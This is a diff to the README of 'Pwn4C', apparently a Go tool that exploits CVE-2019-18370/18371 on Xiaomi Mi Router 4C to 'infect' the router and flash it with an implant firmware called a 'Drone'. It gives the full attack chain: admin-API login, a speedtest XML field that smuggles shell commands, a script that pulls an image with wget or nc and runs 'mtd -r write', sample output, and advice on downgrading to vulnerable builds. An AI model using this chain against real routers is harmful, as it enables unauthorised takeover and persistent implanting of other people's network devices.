@@ -36,11 +36,6 @@ go build -ldflags="-s -w" -o pwn4c .
 sudo cp pwn4c /usr/local/bin/
 ```
 
-The repository vendors `internal/exploit/assets/busybox-mipsel`, which is
-compiled into the CLI with `//go:embed`. If your source checkout is missing
-that file, place a compatible statically linked MIPSel BusyBox binary at
-`internal/exploit/assets/busybox-mipsel` before building.
-
 **Option 2: Download pre-built binary**
 
 Download the appropriate binary from the [GitHub Releases](https://github.com/3lyly0/Pwn4C/releases) page:
@@ -63,22 +58,26 @@ sha256sum -c checksums.sha256
 
 Connect the Host to any LAN port on the stock Xiaomi router. The router's default IP is `192.168.31.1`.
 
+The primary deployment path is a **direct air-gapped flash**. Pass the local Pwn4C sysupgrade image with `--flash`:
+
 ```bash
-pwn4c infect 192.168.31.1
+pwn4c infect 192.168.31.1 --flash firmware/output/pwn4c-firmware-mi4c-sysupgrade.bin
 ```
 
 You will be prompted for the router admin password. What `infect` does, stage by stage (CVE-2019-18370/18371):
 
 1. **Scrape + authenticate** — GETs `/cgi-bin/luci/web`, extracts `deviceId` (MAC) and `key`, derives the `nonce`/`sha1` login hash, and POSTs to `api/xqsystem/login` to obtain the session token (`stok`).
-2. **Build payload** — builds a `tar.gz` in memory containing:
+2. **Build a small payload** — builds a `tar.gz` in memory containing only:
    - `speedtest_urls.xml`: a copy of the stock speedtest list, but the `class type="2"` URL is replaced with `http://<router-ip> -q -O /dev/null;((sh /tmp/script.sh exploit) &);exit;wget ...` — command injection executed when the router runs its speed test.
-   - `script.sh`: sets the `root/root` password, makes the extracted BusyBox executable, starts `telnetd`, and also tries the stock Dropbear init script.
-   - `busybox`: the MIPSel BusyBox binary is **embedded in the tarball** (vendored in `internal/exploit/assets/busybox-mipsel` and compiled into the Go binary). After extraction it is already at `/tmp/busybox`.
-3. **Upload** — POSTs the tarball to `api/misystem/c_upload` as multipart `files={"image": ...}` with a `python-requests` User-Agent.
-4. **Trigger** — GETs `api/xqnetdetect/netspeed?<port>`. The router unpacks the archive to `/tmp`, runs the poisoned speed test, and the injected shell starts `/tmp/busybox telnetd`.
-5. **Verify** — waits ~10s, then probes ports 23/22. Open = root shell ready (`root`/`root`).
+   - `script.sh`: fetches the sysupgrade image from the host via `wget` (with an `nc` fallback), verifies it is non-empty and larger than 1 KB, then runs `mtd -r write /tmp/pwn4c.bin OS1`.
+   The archive contains **no BusyBox, dropbear, or firmware image**, so it stays only a few KB.
+3. **Start firmware server** — the host listens on a random TCP port. The router will fetch only the sysupgrade image from it.
+4. **Upload** — POSTs the tarball to `api/misystem/c_upload` as multipart `files={"image": ...}` with a `python-requests` User-Agent.
+5. **Trigger** — GETs `api/xqnetdetect/netspeed?<port>`. The router unpacks the archive to `/tmp`, runs the poisoned speed test, connects back to the host, downloads the firmware, writes it to OS1, and reboots.
+6. **Wait for firmware fetch** — the host waits up to 60 s for the router to request the image, then up to 2 minutes for the transfer. If the router never requests it, `infect` fails clearly instead of claiming success.
+7. **Reboot + verify** — wait 60–90 s for the router to reboot into Pwn4C OS on `192.168.4.0/24`, reconnect via DHCP or a static address, then run `pwn4c discover`.
 
-No router internet access is needed, and no inbound connection to the host is required for the shell stage. With `--flash`, the host starts a local TCP server only to serve the sysupgrade image; the shell itself still comes from the embedded BusyBox.
+No router internet access is needed. The only host inbound requirement is the temporary TCP port used for the firmware fetch. On Windows, allow `pwn4c.exe` on the **Private** network when prompted, or allow the port printed by the CLI.
 
 Expected output (success):
 
@@ -89,46 +88,38 @@ Expected output (success):
 [*] 2. Authenticating against router API...
 [+] Session Token (stok) acquired: <redacted-32-hex-chars>
 [*] 3. Detected Host PC Local IP: 192.168.31.74
-[*] 4. No local TCP server needed: busybox is embedded in the payload
-[*] 5. Building air-gapped payload (embedded busybox-mipsel)...
-    -> payload size=<compressed-size> sha256=...
+[*] 4. Firmware server listening on 0.0.0.0:<port>
+    -> Windows firewall: allow inbound TCP <port> from 192.168.31.1 on the private network.
+[*] 5. Building small air-gapped payload (XML + script only)...
+    -> payload size=<few-KB> sha256=...
 [*] 6. Uploading tarball to router (Raw HTTP POST)...
     -> Archive accepted successfully (code 0)!
 [*] 7. Triggering command injection...
-[*] Waiting 10 seconds for the router to extract the payload and start telnetd...
-
-[+] Done! Root shell is ready on 192.168.31.1
-    telnet 192.168.31.1          (user: root, password: root)
-    ssh root@192.168.31.1       (password: root)
-[+] Infection complete.
+[*] 8. Waiting up to 1m0s for the router to request the firmware...
+[+] Router requested firmware; streaming pwn4c-firmware-mi4c-sysupgrade.bin
+[*] 9. Waiting up to 2m0s for the firmware transfer to complete...
+[+] Firmware transfer complete: <n> bytes sent.
+[+] Flash initiated: the router is running `mtd -r write /tmp/pwn4c.bin OS1` and should reboot into Pwn4C OS.
+    Wait 60-90 seconds, then reconnect to the 192.168.4.0/24 network (DHCP or static 192.168.4.10/24).
+    Verify with: pwn4c discover    (expected drone IP: 192.168.4.1)
+[+] Flash transfer complete. Router should reboot into Pwn4C OS on 192.168.4.1.
 ```
 
-> **Note on `code 1629`:** some firmware (e.g. Global `3.0.23`) answers the upload with `{"code":1629,"msg":"解压失败..."}` **and still extracts + executes the payload**. `infect` therefore treats a non-zero upload code as a warning, continues to the trigger stage, and lets the port check decide. Only if ports 23/22 stay closed is the run reported as failed (usually: patched firmware — see below). Details in [troubleshooting.md](troubleshooting.md#router-rejected-archive-code1629-解压失败可能文件已经损坏).
+> **Upload codes:** `code=1629` (解压失败) can still appear on some firmware and is treated as a warning; `infect` continues to the trigger stage. `code=1630` is a hard failure meaning the archive exceeded the router's size limit. The current payload is XML + script only (a few KB) and should never hit it; the CLI also enforces a local 100 KB safety limit.
 
-> **Current scope (Path A):** `infect` ends with a verified **root shell** (telnet/SSH on the stock Xiaomi firmware).
-> The next manual step is to flash the Pwn4C OpenWrt image from that shell:
-> ```bash
-> # From telnet 192.168.31.1 (root/root):
-> # 1. On the host, serve the sysupgrade image:
-> python3 -m http.server 8080 --directory ./firmware/output/
-> # 2. On the router (telnet):
-> wget http://<host-ip>:8080/pwn4c-firmware-mi4c-sysupgrade.bin -O /tmp/pwn4c.bin
-> mtd -r write /tmp/pwn4c.bin OS1
-> # Router reboots into Pwn4C OS. Reconnect on 192.168.4.0/24.
-> ```
-> Full automation of the flash+reboot+discovery sequence is planned for a future release.
+> **Optional debug path:** running `pwn4c infect <ip>` without `--flash` only tries the stock telnetd/dropbear and probes ports 22/23. It does not deploy the implant. Use `--flash` for real deployment.
 
-### A.3 Post-Infection Network Setup
+### A.3 Post-Flash Network Setup
 
-Right after `infect`, the router still runs stock firmware on `192.168.31.0/24` — verify the shell first:
+After the flash transfer completes, wait 60–90 seconds for the router to reboot. It now runs Pwn4C OS on `192.168.4.0/24`, not the stock `192.168.31.0/24` network.
+
+Reconnect the Host directly to any LAN port on the Drone. The Drone's built-in DHCP server normally assigns the Host an address automatically. Verify with:
 
 ```bash
-telnet 192.168.31.1   # user: root, password: root
+pwn4c discover
 ```
 
-Once the Pwn4C OpenWrt image is flashed (next stage), the Drone will operate on the `192.168.4.0/24` subnet instead. Reconnect the Host directly to any LAN port on the Drone. The Drone's built-in DHCP server assigns the Host an address automatically.
-
-If DHCP does not work, set a static IP:
+If DHCP does not work, set a static address in `192.168.4.0/24`:
 
 ```bash
 # Linux
@@ -137,15 +128,22 @@ sudo ip addr add 192.168.4.10/24 dev eth0
 sudo ip link set eth0 up
 ```
 
+```powershell
+# Windows (Administrator PowerShell; adjust the interface alias)
+New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.4.10 -PrefixLength 24
+```
+
 ### A.4 What If `infect` Fails?
 
 | Failure | Cause | Solution |
 |---------|-------|----------|
 | `unable to extract deviceId/key` | Router web page unreachable or changed layout | Check LAN link/IP; the router must serve `/cgi-bin/luci/web` |
 | `login rejected` | Wrong admin password | Re-enter the password set in the Xiaomi admin panel |
-| `upload code=1629` + ports closed | Patched firmware (e.g. China `2.14.502` rejects all archives) | Downgrade to a vulnerable build (`2.14.75`–`2.14.92`, Global `3.0.23`), or use Path B |
-| `telnet (23) and ssh (22) are both closed` | Injection did not execute, wrong admin password, or LAN/host firewall issue | Retry once; check the password; try `telnet 192.168.31.1` manually; confirm the host is on the router's LAN (not WAN) and has no firewall blocking outbound LAN traffic; if persistent, use Path B |
+| `router rejected ... code=1630` | Archive exceeded the router's upload limit | Rebuild the CLI; keep the payload to XML + script only (no binaries) |
+| `router did not request the firmware` | Injection did not run, or the router cannot reach the host listener | Retry; allow `pwn4c.exe`/the printed TCP port through the Windows firewall; confirm both devices are on `192.168.31.0/24` and use a LAN port, not WAN |
+| `firmware transfer failed` | Router closed the connection or `/tmp` is full | Reboot the router to clear `/tmp`, then retry |
 | `mtd write failed` | Insufficient `/tmp` space or flash write error | Reboot router to stock, retry. If persistent, use UART |
+| `telnet (23) and ssh (22) are both closed` (no `--flash`) | Secondary stock-shell path only; injection did not execute | Use `--flash` for deployment, or fall back to Path B |
 
 See [troubleshooting.md](troubleshooting.md#exploit-failures) for detailed diagnosis.
 
